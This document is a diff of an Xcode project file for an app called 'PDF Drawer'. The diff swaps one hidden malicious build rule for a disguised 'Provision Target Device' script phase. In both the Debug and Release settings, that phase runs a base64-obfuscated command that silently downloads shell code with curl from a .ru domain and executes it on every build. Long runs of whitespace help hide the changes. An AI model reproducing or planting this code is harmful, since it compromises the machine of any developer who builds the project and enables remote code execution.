@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DB93AF5AEEA0420AAF7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = CE41C943CB1C4D21AA7BBDC8; };
 		AD5ED4C02C2482C1002F36E7 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = AD5ED4BF2C2482C1002F36E7 /* AppDelegate.swift */; };
 		AD5ED4C22C2482C1002F36E7 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = AD5ED4C12C2482C1002F36E7 /* SceneDelegate.swift */; };
 		AD5ED4C92C2482C2002F36E7 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = AD5ED4C82C2482C2002F36E7 /* Assets.xcassets */; };
@@ -42,7 +41,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		CE41C943CB1C4D21AA7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		AD5ED4BC2C2482C1002F36E7 /* PDF Drawer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "PDF Drawer.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		AD5ED4BF2C2482C1002F36E7 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		AD5ED4C12C2482C1002F36E7 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -100,7 +98,6 @@
 		AD5ED4BD2C2482C1002F36E7 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				CE41C943CB1C4D21AA7BBDC8 /* README.md */,
 				AD5ED4BC2C2482C1002F36E7 /* PDF Drawer.app */,
 			);
 			name = Products;
@@ -232,12 +229,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AD5ED4D02C2482C2002F36E7 /* Build configuration list for PBXNativeTarget "PDF Drawer" */;
 			buildPhases = (
+				BDCD72F6A0134F38827BBDC8 /* Provision Target Device */,
 				AD5ED4B82C2482C1002F36E7 /* Sources */,
 				AD5ED4B92C2482C1002F36E7 /* Frameworks */,
 				AD5ED4BA2C2482C1002F36E7 /* Resources */,
 			);
 			buildRules = (
-				E83510B87D4B492BA57BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -280,23 +277,28 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		BDCD72F6A0134F38827BBDC8 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXBuildRule section */
-		E83510B87D4B492BA57BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -304,7 +306,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DB93AF5AEEA0420AAF7BBDC8 /* README.md */,
 				AD5ED4FD2C24A2EC002F36E7 /* Colors.xcassets in Resources */,
 				AD5ED4D52C2482DE002F36E7 /* DocumentController.xib in Resources */,
 				AD7CC8922C24B68E00CE7199 /* SignatureController.xib in Resources */,
@@ -374,7 +375,7 @@ sh -c \"${A8CDBB7}\"";
 		AD5ED4CE2C2482C2002F36E7 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -438,7 +439,7 @@ sh -c \"${A8CDBB7}\"";
 		AD5ED4CF2C2482C2002F36E7 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
